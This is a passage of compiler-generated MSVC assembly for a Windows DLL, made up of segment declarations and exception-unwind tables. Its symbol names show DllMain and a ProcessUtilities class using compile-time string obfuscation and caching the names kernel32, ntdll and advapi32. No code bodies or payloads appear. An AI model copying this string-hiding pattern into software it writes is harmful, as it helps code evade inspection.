?obfuscated_data@?1???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4V45@A DB 0bH DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_2>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0GPFFMNJFHLKDFJAP@D@ay@@XZ@51 DD 01H DUP (?) ; `ProcessUtilities::freqDLLS::<lambda_1>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@51 DD 01H DUP (?) ; ``DllMain'::`4'::<lambda_1>::operator()'::`2'::`local static thread guard'
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4V45@A DB 027H DUP (?) ; ``DllMain'::`4'::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4V45@A DB 012H DUP (?) ; ``DllMain'::`4'::<lambda_2>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51
_TLS	SEGMENT
??__J?1???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@51 DD 01H DUP (?) ; ``DllMain'::`4'::<lambda_2>::operator()'::`2'::`local static thread guard'
?kernel32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B DB 020H DUP (?) ; ProcessUtilities::freqDLLS::kernel32
?ntdll@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B DB 020H DUP (?) ; ProcessUtilities::freqDLLS::ntdll
?advapi32@freqDLLS@ProcessUtilities@@3V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@B DB 020H DUP (?) ; ProcessUtilities::freqDLLS::advapi32
_BSS	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN7
	DD	imagerel $LN7+34
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z DD imagerel $LN4
	DD	imagerel $LN4+48
	DD	imagerel $unwind$??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z DD imagerel $LN34
	DD	imagerel $LN34+107
	DD	imagerel $unwind$?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z DD imagerel $LN24
	DD	imagerel $LN24+51
	DD	imagerel $unwind$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD imagerel $LN37
	DD	imagerel $LN37+106
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Uninitialized_copy@PEA_WPEA_WV?$allocator@_W@std@@@std@@YAPEA_WPEA_W00AEAV?$allocator@_W@0@@Z DD imagerel $LN24
	DD	imagerel $LN24+51
	DD	imagerel $unwind$??$_Uninitialized_copy@PEA_WPEA_WV?$allocator@_W@std@@@std@@YAPEA_WPEA_W00AEAV?$allocator@_W@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Buy_raw@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD imagerel $LN45
	DD	imagerel $LN45+131
	DD	imagerel $unwind$?_Buy_raw@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD imagerel $LN50
	DD	imagerel $LN50+24
	DD	imagerel $unwind$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD imagerel $LN50+24
	DD	imagerel $LN50+120
	DD	imagerel $chain$0$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD imagerel $LN50+120
	DD	imagerel $LN50+126
	DD	imagerel $chain$1$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z DD imagerel $LN50+126
	DD	imagerel $LN50+138
	DD	imagerel $chain$2$?_Buy_nonzero@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z DD imagerel $LN30
	DD	imagerel $LN30+137
	DD	imagerel $unwind$?_Change_array@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXQEA_W_K1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ DD imagerel $LN4
	DD	imagerel $LN4+17
	DD	imagerel $unwind$?_Xlength@?$vector@_WV?$allocator@_W@std@@@std@@CAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Tidy_deallocate_guard@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@QEAA@XZ DD imagerel $LN44
	DD	imagerel $LN44+102
	DD	imagerel $unwind$??1?$_Tidy_deallocate_guard@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Tidy_guard@V?$vector@_WV?$allocator@_W@std@@@std@@@std@@QEAA@XZ DD imagerel $LN37
	DD	imagerel $LN37+98
	DD	imagerel $unwind$??1?$_Tidy_guard@V?$vector@_WV?$allocator@_W@std@@@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD imagerel $LN57
	DD	imagerel $LN57+127
	DD	imagerel $unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD imagerel $LN160
	DD	imagerel $LN160+68
	DD	imagerel $unwind$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD imagerel $LN160+68
	DD	imagerel $LN160+384
	DD	imagerel $chain$3$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD imagerel $LN160+384
	DD	imagerel $LN160+396
	DD	imagerel $chain$5$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$6$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z DD imagerel $LN160+396
	DD	imagerel $LN160+402
	DD	imagerel $chain$6$??$_Emplace_reallocate@_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_W$$QEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD imagerel $LN109
	DD	imagerel $LN109+46
	DD	imagerel $unwind$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD imagerel $LN109+46
	DD	imagerel $LN109+187
	DD	imagerel $chain$1$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD imagerel $LN109+187
	DD	imagerel $LN109+188
	DD	imagerel $chain$2$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$3$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD imagerel $LN109+188
	DD	imagerel $LN109+194
	DD	imagerel $chain$3$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD imagerel $LN109+194
	DD	imagerel $LN109+200
	DD	imagerel $chain$4$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z DD imagerel $LN109+200
	DD	imagerel $LN109+206
	DD	imagerel $chain$5$??$_Construct_n@PEA_WPEA_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAX_K$$QEAPEA_W1@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_from_iter@PEADPEAD_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXPEADQEAD_K@Z DD imagerel $LN140
	DD	imagerel $LN140+322
	DD	imagerel $unwind$??$_Construct_from_iter@PEADPEAD_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXPEADQEAD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$vector@_WV?$allocator@_W@std@@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DD imagerel $LN117
	DD	imagerel $LN117+203
	DD	imagerel $unwind$??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$vector@_WV?$allocator@_W@std@@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DD imagerel $LN155
	DD	imagerel $LN155+325
	DD	imagerel $unwind$??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z DD imagerel $LN23
	DD	imagerel $LN23+62
	DD	imagerel $unwind$?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD imagerel $LN27
	DD	imagerel $LN27+66
	DD	imagerel $unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN38
	DD	imagerel $LN38+97
	DD	imagerel $unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ DD imagerel $LN31
	DD	imagerel $LN31+93
	DD	imagerel $unwind$?_Tidy@?$vector@_WV?$allocator@_W@std@@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN42
	DD	imagerel $LN42+97
	DD	imagerel $unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ DD imagerel $LN35
	DD	imagerel $LN35+93
	DD	imagerel $unwind$??1?$vector@_WV?$allocator@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??B?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAPEADXZ DD imagerel $LN4
	DD	imagerel $LN4+20
	DD	imagerel $unwind$??B?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@QEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ DD imagerel ??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ
	DD	imagerel ??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ+137
	DD	imagerel $unwind$??R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_2>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0BB@$0?DANKNGFANMKOGGOH@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ DD imagerel ??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ
	DD	imagerel ??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ+192
	DD	imagerel $unwind$??R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_1>@?3??DllMain@@YAHPEAUHINSTANCE__@@KPEAX@Z@QEBAAEAV?$obfuscated_data@$0CG@$0?GCMABMJACAMGPGNJ@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$DllMain DD imagerel $LN563
	DD	imagerel $LN563+1564
	DD	imagerel $unwind$DllMain
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$DllMain$dtor$4 DD imagerel DllMain$dtor$4
	DD	imagerel DllMain$dtor$4+87
	DD	imagerel $unwind$DllMain$dtor$4
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$DllMain$dtor$5 DD imagerel DllMain$dtor$5
	DD	imagerel DllMain$dtor$5+87
	DD	imagerel $unwind$DllMain$dtor$5
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$DllMain$dtor$10 DD imagerel DllMain$dtor$10
	DD	imagerel DllMain$dtor$10+87
	DD	imagerel $unwind$DllMain$dtor$10
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ+99
	DD	imagerel $unwind$??__Fadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ+385
	DD	imagerel $unwind$??__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???__Eadvapi32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ DD imagerel ??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ
	DD	imagerel ??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ+111
	DD	imagerel $unwind$??R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_3>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$0N@$0FHPLCBONHLGFABKJ@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ+99
	DD	imagerel $unwind$??__Fntdll@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ+385
	DD	imagerel $unwind$??__Entdll@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???__Entdll@freqDLLS@ProcessUtilities@@YAXXZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ DD imagerel ??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ
	DD	imagerel ??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ+108
	DD	imagerel $unwind$??R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA DD imagerel ?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA
	DD	imagerel ?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA+87
	DD	imagerel $unwind$?dtor$0@?0???R<lambda_2>@freqDLLS@ProcessUtilities@@QEBAAEAV?$obfuscated_data@$09$0?BMGONCACNKPGIEIF@D@ay@@XZ@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ+99
	DD	imagerel $unwind$??__Fkernel32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ DD imagerel ??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
	DD	imagerel ??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ+385
	DD	imagerel $unwind$??__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA DD imagerel ?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA
	DD	imagerel ?dtor$0@?0???__Ekernel32@freqDLLS@ProcessUtilities@@YAXXZ@4HA+87
